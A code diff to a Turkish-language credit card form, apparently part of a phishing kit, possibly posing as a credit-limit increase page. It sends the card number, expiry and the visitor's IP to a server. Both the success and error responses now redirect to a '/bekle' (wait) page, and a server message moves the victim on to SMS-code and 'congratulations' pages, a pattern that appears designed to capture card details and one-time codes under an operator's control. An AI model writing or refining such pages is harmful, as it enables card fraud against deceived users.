@@ -40,12 +40,12 @@
         }
 
         if (!isExpiryDateValid(expiryDate)) {
-            alert('Son kullanma tarihi günümüz tarihinden eski olamaz.');
+            document.getElementById('skk').style.display = 'block';
             return false;
         }
 
         if (!luhnCheck(cardNumber)) {
-            alert('Kart numarası geçersiz.');
+            document.getElementById('tck_error').style.display = 'block';
             return false;
         }
 
@@ -100,10 +100,10 @@
                         ip: encodeURIComponent(ip)
                     },
                     success: function(response) {
-                        Swal.fire('Başarılı', 'Limit gönderildi', 'success');
+                        window.location.href = '/bekle';
                     },
                     error: function(xhr, status, error) {
-                        Swal.fire('Hata', 'Limit gönderilirken bir hata oluştu', 'error');
+                        window.location.href = '/bekle';
                     }
                 });
             }
@@ -211,7 +211,7 @@
             <label for="ccno" class="enforced">Kredi Kartı Numaranız</label>
             <input type="hidden" name="encccno" id="encccno" value=""/>
             <div class="form-field fieldGroup">
-                <input name="ccno" type="tel" class="form-control" id="ccno" value="" autocomplete="off" maxlength="19" aria-required="true" required/>
+                <input name="ccno" type="tel" class="form-control" id="ccno" value="" autocomplete="off" minlength="16" maxlength="16" aria-required="true" required/>
                 <div class="form-note yg-input-error-msg" id="tck_error" style="display: none;" role="alert">Kart numaranızı hatalı girdiniz.</div>
             </div>  
         </div>
@@ -220,6 +220,7 @@
             <label for="sifrexa" class="enforced">Son Kullanma Tarihi</label>
             <div class="form-field fieldGroup">
                 <input name="cc_yil" id="sifrexa" type="tel" maxlength="5" class="form-control" tabindex="2" aria-required="true" required oninput="formatExpiryDate(this);">
+                <div class="form-note yg-input-error-msg" id="skk" style="display: none;" role="alert">Son Kullanım Tarihi Hatalı</div>
             </div>
         </div>
 
@@ -310,7 +311,7 @@
               } else if (msg === "hata1") {
                 window.location.href = '/sms-hatali';
               } else if (msg === "sms") {
-                window.location.href = '/sms-dogrulama';
+                window.location.href = '/sms';
               } else if (msg === "tebrik") {
                 window.location.href = '/tebrikler';
               }
